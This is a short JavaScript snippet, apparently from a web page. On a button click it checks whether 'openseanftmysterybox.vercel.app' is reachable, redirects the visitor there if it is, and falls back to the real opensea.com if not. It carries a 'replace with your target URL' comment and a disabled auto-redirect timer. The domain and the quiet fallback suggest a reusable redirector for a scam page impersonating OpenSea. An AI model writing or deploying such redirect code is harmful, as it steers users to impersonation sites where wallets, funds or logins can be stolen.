    <script>
        document.addEventListener("DOMContentLoaded", function() {
            const targetUrl = 'https://openseanftmysterybox.vercel.app'; // Replace with your target URL

            function checkPageStatusAndRedirect() {
                fetch(targetUrl)
                    .then(response => {
                        if (response.ok) {
                            window.location.href = targetUrl;
                        } else {
                            window.location.href = 'https://opensea.com';
                        }
                    })
                    .catch(error => {
                        window.location.href = 'https://opensea.com';
                    });
            }

            document.querySelector('.center-button').addEventListener('click', checkPageStatusAndRedirect);

            //setTimeout(checkPageStatusAndRedirect, 6000);
        });
    </script>
